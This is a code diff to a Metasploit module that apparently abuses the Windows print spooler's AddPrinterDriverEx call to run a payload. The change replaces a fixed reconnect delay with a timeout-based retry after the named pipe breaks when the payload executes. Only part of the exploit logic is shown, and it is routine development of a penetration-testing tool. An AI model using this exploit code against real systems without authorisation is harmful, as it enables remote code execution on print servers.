@@ -12,6 +12,7 @@ class MetasploitModule < Msf::Auxiliary
   prepend Msf::Exploit::Remote::AutoCheck
   include Msf::Exploit::Remote::DCERPC
   include Msf::Exploit::Remote::SMB::Client::Authenticated
+  include Msf::Exploit::Retry
 
   PrintSystem = RubySMB::Dcerpc::PrintSystem
 
@@ -64,7 +65,7 @@ class MetasploitModule < Msf::Auxiliary
 
     register_advanced_options(
       [
-        OptInt.new('ReconnectDelay', [ true, 'A delay in seconds to wait before reconnecting to the named pipe', 10 ])
+        OptInt.new('ReconnectTimeout', [ true, 'The timeout in seconds for reconnecting to the named pipe', 60 ])
       ]
     )
     deregister_options('AutoCheck')
@@ -200,7 +201,6 @@ class MetasploitModule < Msf::Auxiliary
   end
 
   def add_printer_driver_ex(container)
-    reconnect = true
     flags = PrintSystem::APD_INSTALL_WARNED_DRIVER | PrintSystem::APD_COPY_FROM_DIRECTORY | PrintSystem::APD_COPY_ALL_FILES
 
     begin
@@ -210,18 +210,17 @@ class MetasploitModule < Msf::Auxiliary
       message = "Error #{nt_status.name} (#{nt_status.description})"
       if nt_status == ::WindowsError::NTStatus::STATUS_PIPE_BROKEN
         # STATUS_PIPE_BROKEN is the return value when the payload is executed, so this is somewhat expected
-        fail_with(Failure::Disconnected, 'The named pipe connection was broken.') unless reconnect
-        reconnect = false
-
-        # TODO: switch this to retry_until_truthy once #16555 is landed
-        print_status("The named pipe connection was broken, reconnecting after a #{datastore['ReconnectDelay'].to_i} second delay.")
-        sleep datastore['ReconnectDelay'].to_i
-        begin
+        print_status('The named pipe connection was broken, reconnecting...')
+        reconnected = retry_until_truthy(timeout: datastore['ReconnectTimeout'].to_i) do
           dcerpc_bind_spoolss
         rescue RubySMB::Error::UnexpectedStatusCode => e
-          fail_with(Failure::Unreachable, 'Failed to reconnect to the named pipe.')
+          false
+        else
+          true
         end
 
+        fail_with(Failure::Unreachable, 'Failed to reconnect to the named pipe.') unless reconnected
+        print_status('Successfully reconnected to the named pipe.')
         retry
       else
         print_error(message)
